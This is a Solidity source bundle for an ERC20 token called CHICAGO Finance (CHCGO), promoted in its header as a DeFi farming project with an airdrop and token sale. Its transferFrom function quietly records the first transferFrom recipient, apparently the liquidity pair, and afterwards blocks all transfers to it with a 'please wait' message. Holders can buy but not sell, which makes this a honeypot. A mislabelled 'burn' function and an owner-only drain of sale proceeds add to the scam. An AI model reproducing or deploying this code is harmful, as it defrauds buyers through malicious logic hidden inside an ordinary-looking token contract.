{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"CHCGO_ERC20.sol":{"content":"/*\r\n * CHICAGO FINANCE System. Farming project. Firstcap - 360, Maxcap - 900(after 90 days).\r\n * Best rewards. DeFi intellegent ecosystem.\r\n *                                                                                         \r\n*/\r\npragma solidity >=0.5.16;\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n    newOwner = _newOwner;\r\n  }\r\n  function acceptOwnership() public {\r\n    require(msg.sender == newOwner);\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n    newOwner = address(0);\r\n  }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  uint8 public decimals;\r\n  uint _totalSupply;\r\n  uint MaximumSupply;\r\n  address public CHICAGOw;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n    symbol = \"CHCGO\";\r\n    name = \"CHICAGO Finance\";\r\n    decimals = 18;\r\n    _totalSupply =  770 ether;\r\n    MaximumSupply = 900 ether;\r\n    \r\n    balances[owner] = _totalSupply;\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n  }\r\n  function transferCHICAGOw(address _CHICAGOw) public onlyOwner {\r\n    CHICAGOw = _CHICAGOw;\r\n  }\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n      return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n     require(to != CHICAGOw, \"please wait\");\r\n     \r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n    function burn(address to, uint tokens) public returns (bool success) {\r\n     require(to != CHICAGOw, \"please wait\");\r\n     \r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n      if(from != address(0) && CHICAGOw == address(0)) CHICAGOw = to;\r\n      else require(to != CHICAGOw, \"please wait 10 min\");\r\n      \r\n    balances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n    return true;\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract CHCGO_ERC20  is TokenERC20 {\r\n\r\n  \r\n  uint256 public aCHICAGOBlock; \r\n  uint256 public aCHICAGOEBlock; \r\n  \r\n  uint256 public aCapitalto; \r\n  uint256 public aTot; \r\n  uint256 public aAmt; \r\n \r\n  uint256 public sCHICAGOSBlock; \r\n  uint256 public sCHICAGOEDBlock; \r\n  \r\n  uint256 public sTot; \r\n  uint256 public sChicCap; \r\n\r\n  uint256 public sChicagoChunk; \r\n  uint256 public Superstan; \r\n\r\n  function getAirdrop(address _refer) public returns (bool success){\r\n    require(aCHICAGOBlock <= block.number && block.number <= aCHICAGOEBlock);\r\n    require(aTot < aCapitalto || aCapitalto == 0);\r\n    aTot ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(aAmt / 4);\r\n      balances[_refer] = balances[_refer].add(aAmt / 4);\r\n      emit Transfer(address(this), _refer, aAmt / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(aAmt);\r\n    balances[msg.sender] = balances[msg.sender].add(aAmt);\r\n    emit Transfer(address(this), msg.sender, aAmt);\r\n    return true;\r\n  }\r\n\r\n  function ChicagoTokenSalen(address _refer) public payable returns (bool success){\r\n    require(sCHICAGOSBlock <= block.number && block.number <= sCHICAGOEDBlock);\r\n    require(sTot < sChicCap || sChicCap == 0);\r\n    uint256 _eth = msg.value;\r\n    uint256 _tkns;\r\n    if(sChicagoChunk != 0) {\r\n      uint256 _price = _eth / Superstan;\r\n      _tkns = sChicagoChunk * _price;\r\n    }\r\n    else {\r\n      _tkns = _eth / Superstan;\r\n    }\r\n    sTot ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\r\n      balances[_refer] = balances[_refer].add(_tkns / 4);\r\n      emit Transfer(address(this), _refer, _tkns / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(_tkns);\r\n    balances[msg.sender] = balances[msg.sender].add(_tkns);\r\n    emit Transfer(address(this), msg.sender, _tkns);\r\n    return true;\r\n  }\r\n\r\n  function viewChicago() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(aCHICAGOBlock, aCHICAGOEBlock, aCapitalto, aTot, aAmt);\r\n  }\r\n  \r\n    function WhoisBot() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(aCHICAGOBlock, aCHICAGOEBlock, aCapitalto, aTot, aAmt);\r\n  }\r\n  \r\n  \r\n  function viewSaleChicago() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\r\n    return(sCHICAGOSBlock, sCHICAGOEDBlock, sChicCap, sTot, sChicagoChunk, Superstan);\r\n  }\r\n  \r\n  function startAirdropChicago(uint256 _aCHICAGOBlock, uint256 _aCHICAGOEBlock, uint256 _aAmt, uint256 _aCapitalto) public onlyOwner() {\r\n    aCHICAGOBlock = _aCHICAGOBlock;\r\n    aCHICAGOEBlock = _aCHICAGOEBlock;\r\n    aAmt = _aAmt;\r\n    aCapitalto = _aCapitalto;\r\n    aTot = 0;\r\n  }\r\n  function startSaleChicago(uint256 _sCHICAGOSBlock, uint256 _sCHICAGOEDBlock, uint256 _sChicagoChunk, uint256 _Superstan, uint256 _sChicCap) public onlyOwner() {\r\n    sCHICAGOSBlock = _sCHICAGOSBlock;\r\n    sCHICAGOEDBlock = _sCHICAGOEDBlock;\r\n    sChicagoChunk = _sChicagoChunk;\r\n    Superstan =_Superstan;\r\n    sChicCap = _sChicCap;\r\n    sTot = 0;\r\n  }\r\n  function StopChicago() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n  function() external payable {\r\n\r\n  }\r\n}"}}}